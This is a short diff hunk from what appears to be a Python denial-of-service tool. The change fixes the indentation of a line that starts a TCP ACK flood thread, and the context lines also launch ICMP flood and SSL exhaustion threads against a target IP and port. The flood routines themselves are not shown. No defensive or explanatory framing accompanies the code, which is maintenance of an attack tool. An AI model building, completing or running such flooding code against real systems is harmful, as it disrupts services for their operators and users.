@@ -163,8 +163,9 @@ def main():
     icmp_thread = threading.Thread(target=icmp_flood, args=(target_ip,))
     threads.append(icmp_thread)
 
-        tcp_ack_thread = threading.Thread(target=tcp_ack_flood, args=(target_ip, target_port))
+    tcp_ack_thread = threading.Thread(target=tcp_ack_flood, args=(target_ip, target_port))
     threads.append(tcp_ack_thread)
+
 
     ssl_thread = threading.Thread(target=ssl_exhaustion, args=(target_ip, target_port))
     threads.append(ssl_thread)
